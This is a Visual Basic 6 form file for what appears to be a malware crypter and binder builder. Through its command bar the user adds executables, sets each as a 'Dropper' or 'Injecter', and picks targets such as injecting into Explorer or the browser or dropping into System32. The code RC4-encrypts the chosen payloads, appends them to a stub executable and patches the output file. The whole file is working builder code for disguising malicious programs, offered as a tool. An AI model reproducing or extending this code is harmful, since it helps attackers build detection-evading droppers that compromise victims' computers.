VERSION 5.00
Object = "{555E8FCC-830E-45CC-AF00-A012D5AE7451}#12.0#0"; "Codejock.CommandBars.v12.0.1.ocx"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   750
   ClientLeft      =   120
   ClientTop       =   375
   ClientWidth     =   1635
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   750
   ScaleWidth      =   1635
   StartUpPosition =   3  'Windows-Standard
   Begin MSComDlg.CommonDialog cmdFile 
      Left            =   480
      Top             =   120
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin XtremeCommandBars.ImageManager ImageManager1 
      Left            =   360
      Top             =   360
      _Version        =   786432
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
      Icons           =   "Form1.frx":23D2
   End
   Begin XtremeCommandBars.CommandBars CommandBars1 
      Left            =   840
      Top             =   360
      _Version        =   786432
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
      VisualTheme     =   6
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi.dll" Alias "PathFileExistsA" (ByVal pszPath As String) As Long
Private Sub Command1_Click()


End Sub

Private Sub Form_Load()
Form2.lstFile.Icons = ImageManager1.Icons
    CommandBars1.Icons = ImageManager1.Icons
    Me.Hide
    Form2.Show
End Sub

Private Sub CommandBars1_Execute(ByVal Control As XtremeCommandBars.ICommandBarControl)
    Dim splitted() As String
    Select Case Control.Id
    
    Case 0:
    
    Case ID_Add:
    ' Command ausführen
      cmdFile.Filter = "Executable Files (*.exe)|*.exe"
    cmdFile.ShowOpen
    If cmdFile.FileName <> vbNullString Then
    splitted() = Split(cmdFile.FileName, "\")
    With Form2.lstFile.ListItems.Add(, , splitted(UBound(splitted())), 77)
    .SubItems(1) = cmdFile.FileName
    .SubItems(2) = FileSize(FileLen(cmdFile.FileName))
    .SubItems(3) = "-"
    .SubItems(4) = "-"
    .Bold = True
    .ForeColor = vbBlue
    .ListSubItems(1).ForeColor = vbBlue
    .ListSubItems(2).ForeColor = vbBlue
    .ListSubItems(3).ForeColor = vbBlue
    .ListSubItems(4).ForeColor = vbBlue
    .Selected = True
    
    End With
    End If
    Case ID_Dropper:
    ' Command ausführen
    On Error Resume Next
    Form2.lstFile.SelectedItem.ListSubItems(3).Text = "Dropper"
    Form2.lstFile.SelectedItem.ForeColor = vbGreen
    Form2.lstFile.SelectedItem.ListSubItems(1).ForeColor = vbGreen
    Form2.lstFile.SelectedItem.ListSubItems(2).ForeColor = vbGreen
    Form2.lstFile.SelectedItem.ListSubItems(3).ForeColor = vbGreen
    Form2.lstFile.SelectedItem.ListSubItems(4).ForeColor = vbGreen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "-"
    Case ID_Injecter:
    On Error Resume Next
    Form2.lstFile.SelectedItem.ListSubItems(3).Text = "Injecter"
    Form2.lstFile.SelectedItem.ForeColor = vbRed
    Form2.lstFile.SelectedItem.ListSubItems(1).ForeColor = vbRed
    Form2.lstFile.SelectedItem.ListSubItems(2).ForeColor = vbRed
    Form2.lstFile.SelectedItem.ListSubItems(3).ForeColor = vbRed
    Form2.lstFile.SelectedItem.ListSubItems(4).ForeColor = vbRed
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "-"
    Case ID_InjectStub:
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Inject Stub"
    Case ID_InjectExplorer:
    ' Command ausführen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Inject Explorer"
    Case ID_InjectBrowser:
    ' Command ausführen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Inject Browser"
    Case ID_Delete:
    ' Command ausführen
    Form2.lstFile.ListItems.Remove Form2.lstFile.SelectedItem.Index
    Case ID_NoDrop:
    ' Command ausführen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Not Dropping"
    Case ID_DropSystem32:
    ' Command ausführen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Drop to System32"
    Case ID_DropApp:
    ' Command ausführen
    Form2.lstFile.SelectedItem.ListSubItems(4).Text = "Drop to Application Data"
    Case ID_RC4:
    
    Dim datas As String
    datas = LoadFile(App.Path & "\stub\kewl.exe")
    For i = 1 To Form2.lstFile.ListItems.Count
    If Form2.lstFile.ListItems(i).SubItems(3) = "-" Then
    MsgBox "Type in what to do with this file!"
    Exit Sub
    End If
    
    If Form2.lstFile.ListItems(i).SubItems(4) = "-" Then
    MsgBox "Type in where to Drop/to Inject!"
    Exit Sub
    End If
    datas = datas & "()()()" & RC4(Form2.lstFile.ListItems(i).Text, Form2.Text1.Text) & "|||" & RC4(LoadFile(Form2.lstFile.ListItems(i).ListSubItems(1)), Form2.Text1.Text) & "|||" & GetExecute(Form2.lstFile.ListItems(i).ListSubItems(3)) & "|||" & GetDrop(Form2.lstFile.ListItems(i).ListSubItems(4)) & "|||"
    Next i
    If PathFileExists(App.Path & "\" & Form2.Text2.Text) Then
            Kill App.Path & "\" & Form2.Text2.Text
        End If

       
        Open App.Path & "\" & Form2.Text2.Text For Binary As #2
            
            

            Put #2, , datas & "()()()" & Form2.Text1.Text & "()()()"
            Close #2
            
            PatchEOF (App.Path & "\" & Form2.Text2.Text)
Case ID_XOR:
    MsgBox "XOR Encryption not implemented!"
    ' Command ausführen
    
    Case ID_DELET:
    ' Command ausführen
    
    Case ID_EDIT:
    ' Command ausführen
    
    Case ID_Broadcast:
    ' Command ausführen
    
    Case ID_OPTION:
    ' Command ausführen
    
    Case ID_MULTI_SRV:
    ' Command ausführen
    
    Case ID_MULTI_RESET:
    ' Command ausführen
    
    Case ID_MULTI_DELET:
    ' Command ausführen
    
    Case ID_MULTI_SEND:
    ' Command ausführen
    
    Case ID_MULTI_DOWN:
    ' Command ausführen
    
    Case ID_MULTI_SERV:
    ' Command ausführen
    
    Case ID_MULTI_SERV_UPD:
    ' Command ausführen
    
    End Select
End Sub

Public Function FileSize(ByVal StrSize As String) As String 'Function by andy aka British_Intel
    If StrSize$ < 1024 Then
        FileSize = StrSize$ & " Bytes"
    ElseIf StrSize$ < 1048576 Then
        FileSize = Format(StrSize$ / 1024#, "###0.00") & " KB"
    ElseIf StrSize$ > 1048576 Then
        FileSize = Format(StrSize$ / 1024# ^ 2, "###0.00") & " MB"
    End If
End Function
Public Function RC4(ByVal Expression As String, ByVal Password As String) As String
On Error Resume Next
Dim RB(0 To 255) As Integer, x As Long, y As Long, Z As Long, Key() As Byte, ByteArray() As Byte, Temp As Byte
If Len(Password) = 0 Then
    Exit Function
End If
If Len(Expression) = 0 Then
    Exit Function
End If
If Len(Password) > 256 Then
    Key() = StrConv(Left$(Password, 256), vbFromUnicode)
Else
    Key() = StrConv(Password, vbFromUnicode)
End If
For x = 0 To 255
    RB(x) = x
Next x
x = 0
y = 0
Z = 0
For x = 0 To 255
    y = (y + RB(x) + Key(x Mod Len(Password))) Mod 256
    Temp = RB(x)
    RB(x) = RB(y)
    RB(y) = Temp
Next x
x = 0
y = 0
Z = 0
ByteArray() = StrConv(Expression, vbFromUnicode)
For x = 0 To Len(Expression)
    y = (y + 1) Mod 256
    Z = (Z + RB(y)) Mod 256
    Temp = RB(y)
    RB(y) = RB(Z)
    RB(Z) = Temp
    ByteArray(x) = ByteArray(x) Xor (RB((RB(y) + RB(Z)) Mod 256))
Next x
RC4 = StrConv(ByteArray, vbUnicode)
End Function
Public Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sData As String
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #1
    lFileSize = LOF(1)
    sData = Input$(lFileSize, 1)
    Close #1
    LoadFile = sData
End Function
Public Function GetExecute(Execute As String) As String
Select Case Execute
Case "Injecter"
GetExecute = "1"
Case "Dropper"
GetExecute = "2"
End Select
End Function
Public Function GetDrop(Drop As String) As String
Select Case Drop
Case "Inject Stub"
GetDrop = "1"
Case "Inject Explorer"
GetDrop = "2"
Case "Inject Browser"
GetDrop = "3"
Case "Not Dropping"
GetDrop = "4"
Case "Drop to System32"
GetDrop = "5"
Case "Drop to Application Data"
GetDrop = "6"
End Select
End Function
